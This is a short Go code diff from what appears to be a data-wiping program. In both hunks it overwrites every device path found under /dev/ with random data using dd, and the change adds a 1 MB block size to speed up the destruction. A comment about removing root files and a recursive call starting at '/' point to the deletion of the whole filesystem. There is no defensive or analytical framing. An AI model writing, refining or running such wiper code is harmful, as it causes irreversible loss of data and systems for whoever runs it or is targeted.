@@ -72,7 +72,7 @@ func main() {
 		wordz := strings.Split(res, " ")
 		for _, wordo := range wordz {
 			if strings.Contains(wordo, "/dev/") {
-				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
+				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo, "bs=1M"})
 			}
 		}
 		// Remove Root Files (This should be done as last as possible, target files first) //
@@ -99,7 +99,7 @@ func main() {
 		wordz := strings.Split(res, " ")
 		for _, wordo := range wordz {
 			if strings.Contains(wordo, "/dev/") {
-				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
+				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo, "bs=1M"})
 			}
 		}
 		openAndRecurse("/")
